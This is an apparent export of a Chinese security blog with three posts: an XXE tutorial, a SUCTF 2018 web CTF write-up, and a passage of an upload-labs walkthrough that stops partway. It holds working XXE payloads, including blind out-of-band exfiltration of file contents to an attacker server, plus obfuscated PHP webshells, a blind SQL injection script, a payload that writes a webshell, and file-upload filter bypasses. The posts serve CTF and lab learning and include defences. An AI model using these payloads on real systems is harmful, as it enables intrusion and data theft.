由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。 DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD: 1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD: 1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD文档中有很多重要的关键字如下： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。完整的实体类别可参考 DTD - Entities 实体类别介绍参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体: 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体： 123&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 实例演示：除参数实体外实体+内部实体 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; 实例演示：参数实体+外部实体 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name;]&gt; 注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：实例演示： 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; 普通XXE复现环境：http://vulhub.org/#/environments/php_xxe/ simplexml_load_string.php12345&lt;?php$data = file_get_contents('php://input');$xml = simplexml_load_string($data);echo $xml-&gt;name; 利用 1234567&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; SimpleXMLElement.php12345&lt;?php$data = file_get_contents('php://input');$xml = new SimpleXMLElement($data);echo $xml-&gt;name; 利用 1234567&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; dom.php1234567&lt;?php$data = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom); 同样利用上面的xml 远程XXE123456789101112131415&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY % d SYSTEM "http://192.168.190.1/XXE/evilxxe.dtd"&gt;%d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;libxml_disable_entity_loader(false);$data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);#$data = simplexml_load_string($xml);echo '&lt;pre&gt;';print_r($data);echo '&lt;/pre&gt;'; evilxxe.dtd 1&lt;!ENTITY b SYSTEM &quot;file:///D:/1.txt&quot;&gt; 1.txt的内容是fffffffffffffffffffffff Blind XXE对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 xxe3.php 123456789101112131415161718&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/1.txt"&gt;&lt;!ENTITY % remote SYSTEM "http://192.168.190.1/XXE/evilxxe2.dtd"&gt;%remote;%all;]&gt;&lt;c&gt;&amp;send;&lt;/c&gt;EOF;libxml_disable_entity_loader(false);$data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);#$data = simplexml_load_string($xml);echo '&lt;pre&gt;';print_r($data);echo '&lt;/pre&gt;'; evilxxe2.dtd 123&lt;!ENTITY % all&quot;&lt;!ENTITY send SYSTEM &apos;http://192.168.190.1/XXE/test.php?file=%file;&apos;&gt;&quot;&gt; test.php 123&lt;?php file_put_contents("test.txt", $_GET['file']) ; ?&gt; 访问http://192.168.190.1/XXE/xxe3.php，存在漏洞的服务器会读出1.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。 XXE漏洞修复与防御使用开发语言提供的禁用外部实体的方法PHP： 1libxml_disable_entity_loader(true); JAVA: 12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python： 12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 总结遇到XML相关的交互过程，以如下步骤判断是否存在漏洞： （1）检测XML是否会被解析： 12345&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe “this is xxe”&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt; 如果$xxe;变成了”this is xxe”，那就继续第二步。 （2）检测服务器是否支持外部实体： 12345&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % xxe SYSTEM “http://youhost/evil.xml”&gt;%xxe;]&gt; 通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。 （3）如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。 （4）如果不能回显，毫无疑问，使用Blind XXE攻击方法。 参考链接：XXE学习之路-STEP BY STEP https://security.tencent.com/index.php/blog/msg/69 https://blog.csdn.net/u011721501/article/details/43775691 XXE漏洞的简单理解和测试 XXE漏洞攻防之我见 浅谈XXE漏洞攻击与防御 https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008) https://phonexicum.github.io/infosec/xxe.html（英文博客真不错）]]></content>
      <categories>
        <category>Web安全</category>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-web-Writeup]]></title>
    <url>%2F2018%2F07%2F07%2Fsuctf2018-web-Writeup%2F</url>
    <content type="text"><![CDATA[annonymous12345678910111213&lt;?php$MY = create_function("","die(`cat flag.php`);");$hash = bin2hex(openssl_random_pseudo_bytes(32));eval("function SUCTF_$hash()&#123;" ."global \$MY;" ."\$MY();" ."&#125;");if(isset($_GET['func_name']))&#123; $_GET["func_name"](); die();&#125;show_source(__FILE__); 摘自https://zhuanlan.zhihu.com/p/34947785 create_function()string create_function ( string $args , string $code ) 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称 看一个官方样例 12345678&lt;?php$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);echo &quot;New anonymous function: $newfunc\n&quot;;echo $newfunc(2, M_E) . &quot;\n&quot;;// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; 我们不难得到create_function()的原型 1234function test($a,$b)&#123; return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#125; 摘自https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw 根据题目所给的代码可以看出 它创建了一个匿名函数$MY,调用$MY时脚本结束并输出flag 当给func_name用get方式传参时他会通过变量函数的方式调用函数 在php中匿名函数实际上是有名字的为\00lambda_%d %d为当前apache服务器创建过的匿名函数的数量 实际测试提交5000次请求之后这个值没有超过1250 也就是说服务器会将这个值重置,但是什么时候重置我们不知道,不过这没有关系 可以使用burp向服务器服务器反复提交%00lambda_1来尝试调用这个函数 这里还没有提交不到2000次就得到了flag 参考链接 http://php.net/manual/zh/function.create-function.php PHP审计之常见的危险函数及特殊函数 [科普向] 解析create_function() &amp;&amp; 复现wp https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd HCTF GAME Week 2 解题报告 Getshell12345678if($contents=file_get_contents($_FILES["file"]["tmp_name"]))&#123; $data=substr($contents,5); foreach ($black_char as $b) &#123; if (stripos($data, $b) !== false)&#123; die("illegal char"); &#125; &#125; &#125; 考点： 膜一下P神：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html 从这段代码中可以看出对于上传的内容会有一个waf但是这个waf会忽略前5个字符 经过测试没被waf的字符有 [ ] ( ) ~ = ; _ $ .各种非英文字符 前5个字符不会被waf可以用来写&lt;?php 那么像写出这个shell首先要知道三点: ~(X) 当X为一个汉字时对这个汉字取反第二位很大概率得到一个英文字符 True可以被弱类型为1(所以可以用$[$==$_]来获得1中第二位的英文字符) eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替 坑点: 使用burp查看什么字符被waf，发现只有[ ] ( ) _可以使用，但是实际可以使用的不止这些,在柠檬师傅的指点下发现burp发包时会默认将; . =等符号默认进行url编码,而由于是文件提交服务端并不会对它进行解码同时%被waf导致我们会误认为这些符号不可用 shell one1234567891011echo ~茉[$____];//secho ~内[$____];//yecho ~茉[$____];//secho ~苏[$____];//techo ~的[$____];//eecho ~咩[$____];//mecho ~课[$____];//Pecho ~尬[$____];//Oecho ~笔[$____];//Secho ~端[$____];//Techo ~瞎[$____];//a system($_POST[a]) 12345678910111213141516&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]); shell twoassert($_GET[_]) 1234567891011121314151617181920212223&lt;?php$______=_;$_=~(瞰);$__=$_[$_==$_];$_=~(范);$__=$__.$_[$_==$_];$_=~(范);$__=$__.$_[$_==$_];$_=~(皮);$__=$__.$_[$_==$_];$_=~(半);$__=$__.$_[$_==$_];$_=~(拉);$__=$__.$_[$_==$_];$_=~(为);$___=$_[$_==$_];$_=~(了);$___=$___.$_[$_==$_];$_=~(高);$___=$___.$_[$_==$_];$___=$______.$___;$_=$$___;$__($_[_]); 1234567891011121314汉字取反后的第二位对应的英文字母:&lt;!--特==&gt;1=v瞰==&gt;1=a皮==&gt;1=e为==&gt;1=G高==&gt;1=T哦==&gt;1=l了==&gt;1=E半==&gt;1=r拉==&gt;1=t范==&gt;1=s--&gt; payload 1http://192.168.190.128:32770/upload/d0463af12f203844bbecbacbb576e1be.php?_=system(%27cat%20../../../../Th1s_14_f14g%27) flag在根目录 SUCTF{fake_flag_web_b} mutisql这里有个地方没搞懂就是 怎么知道secure_file_priv的值为/var/www/ http://192.168.190.128:32771/user/user.php?id=2 存在注入，拿起了腹黑师傅的代码改一改在本地运行（http://www.lovei.org/archives/suctf2018.html） 123456789101112131415161718192021222324252627#python 2.7import requestsimport binasciihex = lambda s: binascii.hexlify(s)char = "0123456789ABCDEF"filename = '/var/www/html/bwvs_config/waf.php'c = ''url = 'http://192.168.190.128:32771/user/user.php?id=7-if(hex(load_file(0x%s))like(0x%s),1,2)'for _ in xrange(10000): for i in char: payload = c + i + '%' _url = url % (hex(filename), hex(payload)) # print payload # print _url r = requests.get(_url, cookies=&#123;'PHPSESSID': 'rr102837jt278n11u2sgvi0ll0'&#125;) if 'user_id:6' in r.content: print '......' + payload c = c + i #if len(c) %2 == 0: # print binascii.unhexlify(c) break # else: # print payload # print c 读取文件： /var/www/html/bwvs_config/waf.php 12345678910&lt;?php function waf($str)&#123; $black_str = "/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"; $str = preg_replace($black_str, "@@",$str); return addslashes($str); &#125; ?&gt; user/user.php 12345678910111213141516171819202122232425262728293031&lt;?phpinclude_once('../bwvs_config/sys_config.php');if (isset($_SESSION['user_name'])) &#123; include_once('../header.php'); if (!isset($SESSION['user_id'])) &#123; $sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_name ="."'&#123;$_SESSION['user_name']&#125;'"; $data = mysqli_query($connect,$sql) or die('Mysql Error!!'); $result = mysqli_fetch_array($data); $_SESSION['user_id'] = $result['DWVS_user_id']; &#125; $html_avatar = htmlspecialchars($_SESSION['user_favicon']); if(isset($_GET['id']))&#123; $id=waf($_GET['id']); $sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_id =".$id; $data = mysqli_multi_query($connect,$sql) or die(); $result = mysqli_store_result($connect); $row = mysqli_fetch_row($result); echo '&lt;h1&gt;user_id:'.$row[0]."&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:".$row[1]."&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;æ³¨åæ¶é´ï¼".$row[4]."&lt;/h3&gt;"; mysqli_free_result($result); die(); &#125; mysqli_close($connect);?&gt;&lt;div class="row"&gt; &lt;div style="float:left;"&gt; &lt;img src="&lt;?php echo $html_avatar?&gt;" width= 发现user.php查询id是用mysqli_multi_query，可以执行多条sql语句 既然waf函数过滤了select，可以用set跟hex编码的方式执行SQL语句，绕过过滤函数 set @sql = concat(‘create table ‘,newT,’ like ‘,old); prepare s1 from @sql; execute s1; payload 1http://192.168.190.128:32771/user/user.php?id=22727;set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t; 1http://192.168.190.128:32771/favicon/wfox.php?55332=system(%27cat%20../../../../WelL_Th1s_14_fl4g%27); 姿势2 http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/ 先注册一个用户名为:&lt;?php eval($_POST[bdw]);?&gt;, 在注册一个用户名为:&lt;?php eval($_POST[bdw]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/bdw.php&#39;# 登录第二个用户就写入了shell，然后可以反弹shell，也可以 SUCTF{web_fake_flag_e} 参考链接： load_file()和into outfile：http://wyb0.com/posts/injection-of-mysql-function/]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs]]></title>
    <url>%2F2018%2F07%2F04%2Fupload-labs%2F</url>
    <content type="text"><![CDATA[c0ny1师傅写的upload-labs，受益良多 Pass-011234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == "") &#123; alert("请选择要上传的文件!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.png|.gif"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + "|") == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name; alert(errMsg); return false; &#125;&#125; pass禁用JS代码， firefox插件： NoScript Pass-021234567891011121314151617$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！'; &#125;&#125; move_uploaded_file — 将上传的文件移动到新位置 1bool move_uploaded_file ( string $filename , string $destination ) 本函数检查并确保由 filename 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由destination 指定的文件。 这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。 pass验证Content-Type： Pass-03123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 在线运行代码 1234567891011&lt;?php$file_name='15.png::$DATA';$file_ext = strrchr($file_name, '.');echo $file_ext;$file_ext = strtolower($file_ext); //转换为小写echo $file_ext;$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATAecho $file_ext;$file_ext = trim($file_ext);echo $file_ext;?&gt; 结果 1234.png::$DATA.png::$data.png.png pass12345&lt;FilesMatch "cimer"&gt;SetHandler application/x-httpd一php&lt;/FilesMatch&gt; 通过.htaccess文件，调用php的解析器解析一个文件名只要包含“cimer”这个字符串的任意文件。这个“cimer”的内容如果是一句话木马.即可利用中国莱刀进行连接。 Pass-04123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; passpht后缀 Pass-051234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; passpht 没有对文件名进行小写转换，所以大小写混合或者大写可以绕过 Pass-061234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; pass审计代码发现没有去处空格 利用Windows系统的文件名特性。文件名最后增加点和空格，写成06.php.，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是06.php pht Pass-071234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; pass审计代码发现没有删除结尾的. 原理同Pass-07 文件名后加点，改成07.php. pht Pass-081234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; pass没有删除$DATA Windows文件流特性绕过，文件名改成08.php::$DATA，上传成功后保存的文件名其实是08.php pht Pass-09123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 原理同Pass-06，上传文件名后加上点+空格+点，改为09.php. . pht Pass-1012345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $file_name)) &#123; $img_path = $UPLOAD_ADDR . '/' .$file_name; $is_upload = true; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 关键代码$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。 pht Pass-111234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = '上传失败！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; strrpos — 计算指定字符串在目标字符串中最后一次出现的位置 说明 ¶ 1int strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) 返回字符串 haystack 中 needle 最后一次出现的数字位置。注意 PHP4 中，needle 只能为单个字符。如果 needle 被指定为一个字符串，那么将仅使用第一个字符。 substr — 